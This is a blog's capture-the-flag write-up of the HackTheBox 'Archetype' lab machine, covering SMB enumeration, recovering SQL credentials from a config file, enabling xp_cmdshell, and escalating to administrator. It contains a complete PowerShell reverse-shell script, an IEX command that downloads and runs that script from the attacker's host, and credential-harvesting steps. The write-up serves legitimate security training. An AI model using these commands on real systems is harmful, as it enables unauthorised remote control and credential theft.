<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Jake W. Ireland's Blog | HackTheBox Write-up &mdash; Archetype</title>
  <meta name="description" content="">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="HackTheBox Write-up &amp;mdash; Archetype">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://jakewilliami.github.io//posts/archetype-htb">
  <meta property="og:description" content="">
  <meta property="og:site_name" content="Jake W. Ireland's Blog">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://jakewilliami.github.io//posts/archetype-htb">
  <meta name="twitter:title" content="HackTheBox Write-up &amp;mdash; Archetype">
  <meta name="twitter:description" content="">

  
    <meta property="og:image" content="https://jakewilliami.github.io//assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
    <meta name="twitter:image" content="https://jakewilliami.github.io//assets/og-image-ee46bbc61b334e821e81534b1fd43f3fee6f020ec174b3c2114445695fd48c01.jpg">
  

  <link href="https://jakewilliami.github.io//feed.xml" type="application/rss+xml" rel="alternate" title="Jake W. Ireland's Blog Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-8a826c1e6f10210e502cf6122e9967e86aca67e7c73112953ecb1f7825224740.ico">
      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-8b247c57e0723af875715bdb5192f71527f76df4a09fcaa3ddf8b565f8b71cc2.png">
      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="Jake W. Ireland's Blog">Jake W. Ireland's Blog</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
  </ul>
</nav>



        <article class="article scrollappear">
          <header class="article-header">
            <h1>HackTheBox Write-up &mdash; Archetype</h1>
            <p></p>
            <div class="article-list-footer">
  <span class="article-list-date">
    March 22, 2021
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      19 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p>I am going to have a quick night of attempting the “Starting Point” machines in HackTheBox.  These machines I didn’t see when I first started using HackTheBox, but they seem to be valuable in understanding the usual layout of these kinds of machines.  I think they are of a common author, too.  And I do believe this particular machine is made by the person who made HackTheBox.  So with all that in mind, here goes!</p>

<hr />

<h1 id="the-short-version">The Short Version</h1>
<ol>
<li>Enumerate ports via <code class="highlighter-rouge">nmap -sC -sV 10.10.10.27</code>.  Optionally add the <code class="highlighter-rouge">archetype</code> machine to your <code class="highlighter-rouge">/etc/hosts</code> file for a nicer way of referencing this machine.</li>
<li>Run <code class="highlighter-rouge">smbclient -N -L \\\\10.10.10.27\\</code> to list the directories in the samba storage.  Notice <code class="highlighter-rouge">backups</code> is open access;</li>
<li>Run <code class="highlighter-rouge">smbclient -N \\\\10.10.10.27\\backups</code> to peek inside the <code class="highlighter-rouge">backups</code> directory.  Notice the <code class="highlighter-rouge">prod.dtsConfig</code> file inside;</li>
<li>Get the <code class="highlighter-rouge">prod.dtsConfig</code> by running <code class="highlighter-rouge">get prod.dtsConfig</code> in the samba client;</li>
<li>In your own shell, now run <code class="highlighter-rouge">cat prod.dtsConfig | awk -F'User ID=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the username, and <code class="highlighter-rouge">cat prod.dtsConfig | awk -F'Password=' '{print $2}' | awk -F';' '{print $1}' | tr -d " \t\n\r"</code> to get the password;</li>
<li>Ensure you have Impacket's tools: <code class="highlighter-rouge">git clone https://github.com/SecureAuthCorp/impacket</code>;</li>
<li>We can access the <code class="highlighter-rouge">mssql</code> server using Impacket's <code class="highlighter-rouge">mssqlclient</code> tool: <code class="highlighter-rouge">python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth</code>.  Notice here the use of the username from two steps ago.  When prompted, enter the password obtained from two steps ago;</li>
<li>
Now that you are logged in as <code class="highlighter-rouge">sql_svc</code>, we can run the following series of SQL commands to access the command shell:
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span>
<span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span>
</code></pre></div></div>
</li>
<li>We need to note down your <code class="highlighter-rouge">tun0</code> IP.  On your computer, run: <code class="highlighter-rouge">ifconfig | grep -A 1 'tun0' | tail -1 | grep -o -P 'inet(.{0,15})' | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])'</code>;</li>
<li>
We need to put the following into a <code class="highlighter-rouge">shell.ps1</code> file on your computer:
<div class="language-ps highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$client</span> <span class="nf">=</span> <span class="nf">New-Object</span> <span class="nf">System.Net.Sockets.TCPClient</span><span class="s">("10.10.14.34", 1234)</span><span class="nf">;$stream</span> <span class="nf">=</span> <span class="nf">$client.GetStream</span><span class="s">()</span><span class="nf">;</span><span class="p">[</span><span class="nf">byte</span><span class="p">[]]</span><span class="nf">$bytes</span> <span class="nf">=</span> <span class="nf">0..65535|</span><span class="c1">%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + "# "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.close()</span>
</code></pre></div></div>
Notice that we have your <code class="highlighter-rouge">tun0</code> IP, with some port number (here we have chosen <code class="highlighter-rouge">1234</code>) near the start of the file;
</li>
<li>On your computer, we need to set up an http server for later; run <code class="highlighter-rouge">sudo python3 -m http.server 80</code>.  Ensure you run this in the same directory as your reverse powershell script from the previous step;</li>
<li>Also on your computer, we will need a netcat listener; run <code class="highlighter-rouge">nc -nvlp 1234</code> (or exchange <code class="highlighter-rouge">1234</code> with the port you chose two steps ago.  Note that in the verbatim version, I used this along with <code class="highlighter-rouge">rlwrap</code> to make this step nicer);</li>
<li>Back in the SQL window, now run <code class="highlighter-rouge">xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.34/shell.ps1\");"</code> in order to transfer the reverse powershell script to the SQL database;</li>
<li>Go back to you netcat listener window, and you will see that it has connected to the server!  You can verify this by running <code class="highlighter-rouge">whoami</code>.  You can now run <code class="highlighter-rouge">more \users\sql_svc\desktop\user.txt</code> to capture the user flag!;</li>
<li>This privilege escalation is simple: it only relies on the powershell history file, which requires no higher rights to acces.  Simply run: <code class="highlighter-rouge">type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</code> and you will see a username and a password;</li>
<li>Going back to your computer, we now need to log into the <code class="highlighter-rouge">administrator</code> user.  We can do this using another one of Impacket's scripts: <code class="highlighter-rouge">psexec.py</code>: <code class="highlighter-rouge">python3 impacket/examples/psexec.py administrator@archetype</code>.  Enter the password found in the previous step when prompted;</li>
<li>Now you are logged into the administrator, you can capture the root flat: <code class="highlighter-rouge">more \users\administrator\desktop\root.txt</code>, and you are finished!</li>
</ol>

<h1 id="the-long-verbatim-version">The Long (Verbatim) Version</h1>

<p>We enumerate the ports:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash common/nmap.sh archetype                                                         
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 22:16 NZDT
Nmap scan report for archetype (10.10.10.27)
Host is up (0.24s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-03-22T09:16:33
|_Not valid after:  2051-03-22T09:16:33
|_ssl-date: 2021-03-22T09:38:16+00:00; +21m07s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h45m06s, deviation: 3h07m50s, median: 21m05s
| ms-sql-info:
|   10.10.10.27:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-03-22T02:38:03-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-22T09:38:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.36 seconds
</code></pre></div></div>

<p>This is a good start.  As usual, we look for a web domain to gain a foothold.  There is a lot of information here, but we see an RPC server on port <code class="highlighter-rouge">135</code>, a <code class="highlighter-rouge">netbios-ssn</code> on port <code class="highlighter-rouge">139</code>, a <code class="highlighter-rouge">microsoft-ds</code> on port <code class="highlighter-rouge">445</code>, and an SQL server on port <code class="highlighter-rouge">1433</code>.  However, seeing that there is an SQL server, let’s try to get some SQL tools ready.  I see we can install them <a href="https://docs.microsoft.com/en-us/sql/linux/sql-server-linux-setup-tools?view=sql-server-ver15#ubuntu">via these instructions</a>.  However, this installation is specifically for Ubuntu so it failed.</p>

<p>However, I did find <a href="https://resources.infosecinstitute.com/topic/attacking-ms-sql-server-gain-system-access/">this</a> on the web, and keeping in mind my initial thoughts on HTB, this looks very convenient!</p>

<p>From the link, we see that ExploitDB has some things:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ searchsploit mssql  
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ADODB 4.6/4.7 - 'Tmssql.php' Cross-Site Scripting                                                                                     | php/webapps/28104.txt
ADODB &lt; 4.70 - 'tmssql.php' Denial of Service                                                                                         | php/dos/1651.php
AutoDealer 1.0/2.0 - MSSQL Injection                                                                                                  | php/webapps/12462.txt
MSSQL 7.0 - Remote Denial of Service                                                                                                  | windows/dos/562.c
PHP 4.4.6 - 'mssql_[p]connect()' Local Buffer Overflow                                                                                | windows/local/3417.php
XAMPP for Windows 1.6.0a - 'mssql_connect()' Remote Buffer Overflow                                                                   | windows/remote/3738.php
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

$ searchsploit sql | grep -i 'microsoft'
CA BrightStor Agent for Microsoft SQL - Remote Overflow (Metasploit)                                                                  | windows/remote/16403.rb
Microsoft BizTalk Server 2000/2002 DTA - 'RawCustomSearchField.asp' SQL Injection                                                     | asp/webapps/22555.txt
Microsoft BizTalk Server 2000/2002 DTA - 'rawdocdata.asp' SQL Injection                                                               | asp/webapps/22554.txt
Microsoft Source Code Analyzer for SQL Injection 1.3 - Improper Permissions                                                           | windows/local/16991.txt
Microsoft SQL 2000/7.0 - Agent Jobs Privilege Escalation                                                                              | windows/remote/21718.txt
Microsoft SQL Server - 'sp_replwritetovarbin()' Heap Overflow                                                                         | windows/local/7501.asp
Microsoft SQL Server - Database Link Crawling Command Execution (Metasploit)                                                          | windows/remote/23649.rb
Microsoft SQL Server - Distributed Management Objects 'sqldmo.dll' Buffer Overflow (PoC)                                              | windows/dos/4379.html
Microsoft SQL Server - Distributed Management Objects Buffer Overflow                                                                 | windows/remote/4398.html
Microsoft SQL Server - Hello Overflow (MS02-056) (Metasploit)                                                                         | windows/remote/16398.rb
Microsoft SQL Server - Payload Execution (Metasploit)                                                                                 | windows/remote/16395.rb
Microsoft SQL Server - Payload Execution (via SQL Injection) (Metasploit)                                                             | windows/remote/16394.rb
Microsoft SQL Server - Resolution Overflow (MS02-039) (Metasploit)                                                                    | windows/remote/16393.rb
Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (Metasploit)                                                 | windows/remote/16392.rb
Microsoft SQL Server - sp_replwritetovarbin Memory Corruption (MS09-004) (via SQL Injection) (Metasploit)                             | windows/remote/16396.rb
Microsoft SQL Server 2000 - 'SQLXML' Buffer Overflow (PoC)                                                                            | windows/dos/21540.txt
Microsoft SQL Server 2000 - Database Consistency Checkers Buffer Overflow                                                             | windows/remote/21650.txt
Microsoft SQL Server 2000 - Password Encrypt procedure Buffer Overflow                                                                | windows/local/21549.txt
Microsoft SQL Server 2000 - Resolution Service Heap Overflow                                                                          | windows/remote/21652.cpp
Microsoft SQL Server 2000 - sp_MScopyscript SQL Injection                                                                             | windows/remote/21651.txt
Microsoft SQL Server 2000 - SQLXML Script Injection                                                                                   | windows/remote/21541.txt
Microsoft SQL Server 2000 - User Authentication Remote Buffer Overflow                                                                | windows/remote/21693.nasl
Microsoft SQL Server 2000 / Microsoft Jet 4.0 Engine - Unicode Buffer Overflow (PoC)                                                  | windows/dos/21569.txt
Microsoft SQL Server 7.0 - Remote Denial of Service (1)                                                                               | windows/dos/24639.c
Microsoft SQL Server 7.0 - Remote Denial of Service (2)                                                                               | windows/dos/24640.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_displayparamstmt Buffer Overflow                                            | windows/local/20451.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_peekqueue Buffer Overflow                                                   | windows/local/20457.c
Microsoft SQL Server 7.0/2000 / Data Engine 1.0/2000 - xp_showcolv Buffer Overflow                                                    | windows/local/20456.c
Microsoft SQL Server 7.0/2000 / MSDE - Named Pipe Denial of Service (MS03-031)                                                        | windows/dos/22957.cpp
Microsoft SQL Server 7.0/2000 JET Database Engine 4.0 - Buffer Overrun                                                                | windows/dos/22576.txt
Microsoft SQL Server 7.0/7.0 SP1 - NULL Data Denial of Service                                                                        | windows/dos/19638.c
Microsoft SQL Server Management Studio 17.9 - '.xel' XML External Entity Injection                                                    | windows/local/45585.txt
Microsoft SQL Server Management Studio 17.9 - '.xmla' XML External Entity Injection                                                   | windows/local/45587.txt
Microsoft SQL Server Management Studio 17.9 - XML External Entity Injection                                                           | windows/local/45583.txt
Microsoft SQL Server Reporting Services 2016 - Remote Code Execution                                                                  | windows/remote/48816.py
Microsoft Windows SQL Server - Remote Denial of Service (MS03-031)                                                                    | windows/dos/65.c
Oracle MySQL for Microsoft Windows - Payload Execution (Metasploit)                                                                   | windows/remote/16957.rb
</code></pre></div></div>

<p>So, there are a lot of exploits, it seems.  We need to choose one…  We know that the <code class="highlighter-rouge">mssql</code> server version this machine is using is from 2017.</p>

<p>Let’s quickly have a look at the <a href="https://opensource.com/article/18/1/ms-sql-command-line-client">CLI for <code class="highlighter-rouge">mssql</code></a> before we have a go at the metasploit results.  We need to first run:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>pip <span class="nb">install </span>mssql-cli
<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'PATH=$PATH:$HOME/.local/bin/'</span> <span class="o">&gt;&gt;</span> ~/.zshrc
<span class="nv">$ </span><span class="nb">source</span> ~/.zshrc
</code></pre></div></div>

<p>However, this CLI keeps erroring regarding dependencies, so no good.  Let’s have another look at those metasploit results.</p>

<p>I run</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit -m 23649
</code></pre></div></div>

<p>At this point, I realise I have very little knowledge of how to use metasploit, so I found <a href="https://www.youtube.com/watch?v=8lR27r8Y_ik">this video</a> which helped me understand.  So entering the <code class="highlighter-rouge">msfconsole</code> and we search for exploits:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search type:exploit platform:windows microsoft sql

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/multi/mysql/mysql_udf_payload                     2009-01-16       excellent  No     Oracle MySQL UDF Payload Execution
   1   exploit/windows/brightstor/sql_agent                      2005-08-02       average    No     CA BrightStor Agent for Microsoft SQL Overflow
   2   exploit/windows/http/ssrs_navcorrector_viewstate          2020-02-11       excellent  Yes    SQL Server Reporting Services (SSRS) ViewState Deserialization
   3   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   4   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
   5   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
   6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   7   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   8   exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   9   exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   10  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
   11  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   12  exploit/windows/mysql/mysql_mof                           2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   13  exploit/windows/mysql/mysql_start_up                      2012-12-01       excellent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   14  exploit/windows/postgres/postgres_payload                 2009-04-10       excellent  Yes    PostgreSQL for Microsoft Windows Payload Execution


Interact with a module by name or index. For example info 14, use 14 or use exploit/windows/postgres/postgres_payload
</code></pre></div></div>
<p>Recall that we are dealing with Microsoft SQL Server 2017, and only one of these has an Disclosure Date of later than that, so we choose that one:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; use exploit/windows/http/ssrs_navcorrector_viewstate
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; show targets

Exploit targets:

   Id  Name
   --  ----
   0   Windows (x86)
   1   Windows (x64)
   2   Windows (cmd)


msf6 exploit(windows/http/ssrs_navcorrector_viewstate) &gt; show info

       Name: SQL Server Reporting Services (SSRS) ViewState Deserialization
     Module: exploit/windows/http/ssrs_navcorrector_viewstate
   Platform: Windows
       Arch:
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2020-02-11

Provided by:
  Soroush Dalili
  Spencer McIntyre

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session

Available targets:
  Id  Name
  --  ----
  0   Windows (x86)
  1   Windows (x64)
  2   Windows (cmd)

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  DOMAIN     WORKSTATION      yes       The domain to use for Windows authentication
  PASSWORD                    yes       The password to authenticate with
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /Reports         yes       The base path to the web application
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME                    yes       Username to authenticate as
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  A vulnerability exists within Microsoft's SQL Server Reporting
  Services which can allow an attacker to craft an HTTP POST request
  with a serialized object to achieve remote code execution. The
  vulnerability is due to the fact that the serialized blob is not
  signed by the server.

References:
  https://cvedetails.com/cve/CVE-2020-0618/
  https://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/
</code></pre></div></div>

<p>Let’s quickly digress.</p>

<hr />

<p>After some searching online, we see that <code class="highlighter-rouge">microsoft-ds</code> is actually associated with samba!  We know of samba from our home server, and have <code class="highlighter-rouge">smbclient</code> installed.</p>

<p>We run</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.27<span class="se">\\</span>
</code></pre></div></div>

<p>This enumerates the samba shares available:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="nt">-L</span> <span class="se">\\\\</span>10.10.10.27<span class="se">\\</span>

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Remote Admin
        backups         Disk      
        C<span class="nv">$ </span>             Disk      Default share
        IPC<span class="nv">$ </span>           IPC       Remote IPC
SMB1 disabled <span class="nt">--</span> no workgroup available
</code></pre></div></div>

<p>Let’s have a look at what is in <code class="highlighter-rouge">ADMIN$</code>!:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.10.27<span class="se">\\</span>ADMIN<span class="nv">$ </span>                              1 ⨯
tree connect failed: NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<p>It seems it is not accessible anonymously.  In fact, the only one anonymously accessible is <code class="highlighter-rouge">backups</code>, and here is what we find:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code> smbclient <span class="nt">-N</span> <span class="se">\\\\</span>10.10.10.27<span class="se">\\</span>backups                                                                                                                           1 ⨯
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Tue Jan 21 01:20:57 2020
  ..                                  D        0  Tue Jan 21 01:20:57 2020
  prod.dtsConfig                     AR      609  Tue Jan 21 01:23:02 2020

                10328063 blocks of size 4096. 8260396 blocks available
smb: <span class="se">\&gt;</span>
</code></pre></div></div>

<p>Note that another command for <code class="highlighter-rouge">ls</code> is <code class="highlighter-rouge">dir</code> in samba client.</p>

<p>We run <code class="highlighter-rouge">get prod.dtsConfig</code> to get the file in the backup directory.  It looks like this:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;DTSConfiguration&gt;
    &lt;DTSConfigurationHeading&gt;
        &lt;DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/&gt;
    &lt;/DTSConfigurationHeading&gt;
    &lt;Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String"&gt;
        &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;
    &lt;/Configuration&gt;
&lt;/DTSConfiguration&gt;
</code></pre></div></div>

<p>It looks like there is a password and username here!  We recall from Passage that we have Impacket’s <code class="highlighter-rouge">mssqlclient.py</code> script, and we use it here:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>git clone https://github.com/SecureAuthCorp/impacket
Cloning into <span class="s1">'impacket'</span>...
remote: Enumerating objects: 41, <span class="k">done</span><span class="nb">.</span>
remote: Counting objects: 100% <span class="o">(</span>41/41<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
remote: Total 18922 <span class="o">(</span>delta 25<span class="o">)</span>, reused 20 <span class="o">(</span>delta 9<span class="o">)</span>, pack-reused 18881
Receiving objects: 100% <span class="o">(</span>18922/18922<span class="o">)</span>, 6.27 MiB | 3.79 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>14401/14401<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
                                                                                                                                                                        
<span class="nv">$ </span>python3 impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 <span class="nt">-windows-auth</span>
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL&gt;
</code></pre></div></div>

<p>Now we are logged in as user <code class="highlighter-rouge">ARCHETYPE\sql_svc</code>!</p>

<p>Let’s have a look at the help commands:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; help

     lcd {path}                 - changes the current local directory to {path}
     exit                       - terminates the server process (and this session)
     enable_xp_cmdshell         - you know what it means
     disable_xp_cmdshell        - you know what it means
     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
     ! {cmd}                    - executes a local shell cmd
</code></pre></div></div>

<p>This is curious; particularly the <code class="highlighter-rouge">xp_cmdshell</code> ones…  We need a way to change this SQL shell into an RCE.  Searching <code class="highlighter-rouge">xp_cmdshell</code>, I found <a href="https://www.mssqltips.com/sqlservertip/1020/enabling-xpcmdshell-in-sql-server/">this</a> on the web to help us do this!  Running</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- this turns on advanced options and is needed to configure xp_cmdshell</span>
<span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span>
<span class="c1">-- this enables xp_cmdshell</span>
<span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="s1">'1'</span>
<span class="n">RECONFIGURE</span>
</code></pre></div></div>

<p>Here is the output:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL&gt; sp_configure 'show advanced options', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL&gt; RECONFIGURE
SQL&gt; sp_configure 'xp_cmdshell', '1'
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL&gt; RECONFIGURE
SQL&gt; xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL                                                                               

SQL&gt;
</code></pre></div></div>

<p>Now we have a command shell!  We can then turn this into a nicer shell.  Our python command from Passage unfortunately does not work;</p>
